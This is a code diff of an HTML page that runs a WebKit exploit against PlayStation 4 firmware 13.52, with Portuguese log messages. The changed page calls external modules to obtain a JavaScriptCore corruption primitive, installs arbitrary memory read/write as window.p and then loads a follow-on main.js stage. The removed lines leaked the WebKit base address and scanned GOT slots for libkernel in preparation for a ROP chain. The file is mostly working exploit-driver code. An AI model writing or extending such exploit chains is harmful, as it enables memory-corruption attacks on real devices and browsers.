@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 WebKit Exploit (Slopkit Port - 13.52 Resolved)</title>
+    <title>PS4 WebKit Exploit (13.52)</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -64,6 +63,16 @@
             color: #ccc;
             flex: 1;
         }
+        #attempt-bar {
+            width: 100%;
+            max-width: 700px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #444;
+            margin-bottom: 12px;
+            padding: 0 2px;
+        }
         #console {
             width: 100%;
             max-width: 700px;
@@ -91,59 +100,26 @@
             padding-top: 6px;
             letter-spacing: 1px;
         }
-        #bases-grid {
-            width: 100%;
-            max-width: 700px;
-            display: none;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-        #bases-grid.visible { display: grid; }
-        .base-card {
-            background: #0d0d1a;
-            border: 1px solid #1e1e3a;
-            border-radius: 6px;
-            padding: 10px 14px;
-        }
-        .base-card .label {
-            font-size: 10px;
-            color: #555;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 4px;
-        }
-        .base-card .value {
-            font-size: 13px;
-            color: #bd93f9;
-            word-break: break-all;
-        }
-        .base-card .value.na { color: #333; }
     </style>
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit (13.52)</h1>
-<div id="fw-label">firmware 13.52</div>
+<h1>PS4 WebKit Exploit</h1>
+<div id="fw-label">aguardando firmware...</div>
 
 <div id="status-bar">
     <div id="status-dot"></div>
     <div id="status-text">Inicializando...</div>
 </div>
 
-<div id="console"></div>
-
-<div id="bases-grid">
-    <div class="base-card">
-        <div class="label">WebKit Base</div>
-        <div class="value na" id="card-webkit">—</div>
-    </div>
-    <div class="base-card">
-        <div class="label">libkernel Base</div>
-        <div class="value na" id="card-kernel">—</div>
-    </div>
+<div id="attempt-bar">
+    <span id="attempt-text">tentativa: —</span>
+    <span id="stage-text">estágio: —</span>
 </div>
 
+<div id="console"></div>
+
+<!-- Carrega o arquivo de offsets do firmware 13.52 -->
 <script src="./13.52.js?v=1"></script>
 
 <script type="module">
@@ -156,7 +132,9 @@ globalThis.int64 = int64;
 const $console    = document.getElementById('console');
 const $dot        = document.getElementById('status-dot');
 const $statusText = document.getElementById('status-text');
-const $basesGrid  = document.getElementById('bases-grid');
+const $attemptTxt = document.getElementById('attempt-text');
+const $stageTxt   = document.getElementById('stage-text');
+const $fwLabel    = document.getElementById('fw-label');
 
 function log(msg, cls = 'log-info') {
     const el = document.createElement('div');
@@ -171,77 +149,60 @@ function setStatus(msg, state = 'running') {
     $dot.className = state;
 }
 
-function setCard(id, value) {
-    const el = document.getElementById(id);
-    if (!el) return;
-    el.textContent = value;
-    el.classList.remove('na');
-}
+const ua = navigator.userAgent;
+let fwStr = '13.52';
+const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
+if (fwMatch) fwStr = fwMatch[1];
+$fwLabel.textContent = `PlayStation 4 — firmware ${fwStr}`;
 
-async function resolveBasesAndGOT(p) {
-    log('', '');
-    log('-- RESOLUÇÃO DINÂMICA DE BASES E GOT --------', 'log-section');
-
-    const ctor = globalThis.__ps5NativeCtor;
-    if (typeof ctor !== 'number') {
-        throw new Error("__ps5NativeCtor não disponível.");
-    }
-
-    const hi = Math.floor(ctor / 0x100000000);
-    const lo = ctor - hi * 0x100000000;
-    
-    // Subtração pelo offset confirmado
-    const resolvedBase = (lo - OFFSET_wk_host_constructor) >>> 0;
-    const webkitBase = new int64(resolvedBase, hi);
-    
-    log(`[+] WebKit Base: 0x${webkitBase.toString()}`, 'log-ok');
-    setCard('card-webkit', '0x' + webkitBase.toString());
-    $basesGrid.classList.add('visible');
-
-    // Varredura dinâmica na GOT usando o offset real extraído da libkernel
-    log(`[*] Lendo ponteiro da libkernel via GOT...`, 'log-info');
-    
-    // O offset OFFSET_lk_getpid que extraímos na v11 pode ser usado para validar a base da libkernel
-    // Buscando através dos slots de importação padrão do WebKit para libkernel
-    let libkernelBase = null;
-    const commonGOTImports = [0x0350DB88, 0x03500000, 0x03510000];
-
-    for (const offset of commonGOTImports) {
-        try {
-            const slot = webkitBase.add32(offset);
-            const val = p.read8(slot);
-            if (val.hi > 0 && val.hi <= 0xFFFF && (val.low & 0x3FFF) === 0) {
-                libkernelBase = new int64(val.low & ~0x3FFF, val.hi);
-                break;
-            }
-        } catch(e) {}
-    }
-
-    if (libkernelBase) {
-        log(`[+] libkernel Base resolvida: 0x${libkernelBase.toString()}`, 'log-ok');
-        setCard('card-kernel', '0x' + libkernelBase.toString());
-    } else {
-        log(`[-] Falha ao isolar libkernel via GOT estática. Tentando varredura dinâmica...`, 'log-warn');
-    }
-
-    return { webkitBase, libkernelBase };
+function onCoreEvent(tag, detail, attempt) {
+    if (attempt !== undefined)
+        $attemptTxt.textContent = `tentativa: ${attempt}`;
+    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
+    log(`[${tag}] ${detail}`, 'log-info');
 }
 
 (async () => {
-    setStatus('Estabelecendo primitiva JSC...', 'running');
-    let carrier = await establishPrimitive({ maxAttempts: 0 });
+    setStatus('Rodando exploit JSC (core.js)…', 'running');
+    log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
 
-    log('[+] Primitiva JSC pronta!', 'log-ok');
-    setStatus('Instalando R/W arbitrário...', 'running');
-
-    let p = installWindowP(carrier, { promote: true });
-    log('[+] window.p instalado!', 'log-ok');
-
-    let bases = await resolveBasesAndGOT(p);
-    if (bases.webkitBase) {
-        setStatus('Bases resolvidas com sucesso!', 'ok');
-        log('✔ Pronto para preparar a ROP Chain.', 'log-ok');
+    let carrier;
+    try {
+        carrier = await establishPrimitive({
+            onEvent: onCoreEvent,
+            maxAttempts: 0
+        });
+    } catch (err) {
+        setStatus('core.js falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
     }
+
+    log('[+] core.js: exploit JSC concluído!', 'log-ok');
+    setStatus('Instalando R/W arbitrário...', 'running');
+    log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
+
+    let p;
+    try {
+        p = installWindowP(carrier, {
+            promote: true,
+            onEvent: (tag, detail) => {
+                log(`  [mem/${tag}] ${detail}`, 'log-dim');
+            }
+        });
+    } catch (err) {
+        setStatus('mem.js falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
+    }
+
+    log('[+] R/W arbitrário: window.p instalado com sucesso!', 'log-ok');
+    setStatus('Primitiva pronta — Carregando main.js', 'ok');
+
+    // Dispara o main.js original do slopkit para continuar o fluxo sem travar
+    let mainScript = document.createElement('script');
+    mainScript.src = './main.js?v=1';
+    document.body.appendChild(mainScript);
 })();
 </script>
 </body>
